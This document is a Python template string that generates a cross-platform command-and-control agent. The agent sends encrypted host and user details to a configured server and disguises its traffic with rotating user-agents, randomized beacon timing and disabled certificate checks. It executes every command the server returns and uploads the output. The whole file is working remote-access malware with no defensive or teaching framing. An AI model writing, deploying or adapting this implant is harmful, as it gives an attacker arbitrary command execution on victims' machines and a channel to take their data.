PYTHON_TEMPLATE = '''#!/usr/bin/env python3
"""
Custom Cross-Platform C2 Agent
Generated on: {generated_time}
Server: {server_url}
"""

import os
import sys
import json
import time
import base64
import random
import socket
import platform
import subprocess
import requests
from datetime import datetime

# === EMBEDDED CONFIGURATION ===
SERVER_URL = "{server_url}"
AUTH_TOKEN = "{auth_token}"
ENCRYPTION_PASSWORD = "{encryption_password}"
BEACON_INTERVAL = {beacon_interval}
JITTER = {jitter}

# === Encryption Setup ===
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

def derive_key(password: str):
    salt = b'c2_infrastructure_salt_2024'
    kdf = PBKDF2(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return Fernet(key)

cipher = derive_key(ENCRYPTION_PASSWORD)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === Core Agent Class ===
class C2Agent:
    def __init__(self):
        self.session_id = None
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]

    def encrypt(self, data):
        if isinstance(data, dict):
            data = json.dumps(data).encode()
        encrypted = cipher.encrypt(data)
        return base64.b64encode(encrypted).decode()

    def decrypt(self, data_b64):
        try:
            decoded = base64.b64decode(data_b64.encode())
            decrypted = cipher.decrypt(decoded)
            return json.loads(decrypted.decode())
        except:
            return None

    def get_system_info(self):
        info = {{
            "hostname": socket.gethostname(),
            "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "os_type": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "is_admin": os.geteuid() == 0 if platform.system() != "Windows" else False
        }}
        if self.session_id:
            info["session_id"] = self.session_id
        return info

    def execute(self, cmd):
        try:
            result = subprocess.run(
                cmd if platform.system() != "Windows" else ["cmd.exe", "/c", cmd],
                shell=isinstance(cmd, str),
                capture_output=True, text=True, timeout=300
            )
            output = result.stdout + result.stderr
            return output.strip() or "[No output]"
        except Exception as e:
            return f"[ERROR] {{e}}"

    def beacon(self):
        payload = {{"data": self.encrypt(self.get_system_info())}}
        headers = {{
            "Authorization": f"Bearer {{AUTH_TOKEN}}",
            "User-Agent": random.choice(self.user_agents),
            "Content-Type": "application/json"
        }}
        try:
            r = requests.post(
                f"{{SERVER_URL}}/api/v1/sync",
                json=payload,
                headers=headers,
                verify=False,
                timeout=30
            )
            if r.status_code == 200 and r.json().get("status") == "success":
                return self.decrypt(r.json().get("data", ""))
        except:
            pass
        return None

    def submit_result(self, task_id, output):
        data = {{
            "session_id": self.session_id,
            "task_id": task_id,
            "output": output
        }}
        payload = {{"data": self.encrypt(data)}}
        try:
            requests.post(
                f"{{SERVER_URL}}/api/v1/results",
                json=payload,
                headers={{"Authorization": f"Bearer {{AUTH_TOKEN}}"}},
                verify=False,
                timeout=30
            )
        except:
            pass

    def run(self):
        print("[*] Cross-Platform Python Agent Starting...")
        print(f"[*] Server: {{SERVER_URL}} | Interval: {{BEACON_INTERVAL}}s ± {{JITTER}}s")

        while True:
            resp = self.beacon()
            if resp:
                if not self.session_id:
                    self.session_id = resp.get("session_id")
                    print(f"[+] Session: {{self.session_id}}")

                for task in resp.get("tasks", []):
                    print(f"[>] Task {{task['task_id'][:8]}}... {{task['command'][:50]}}")
                    output = self.execute(task["command"])
                    self.submit_result(task["task_id"], output)

            time.sleep(max(1, BEACON_INTERVAL + random.randint(-JITTER, JITTER)))

if __name__ == "__main__":
    C2Agent().run()
'''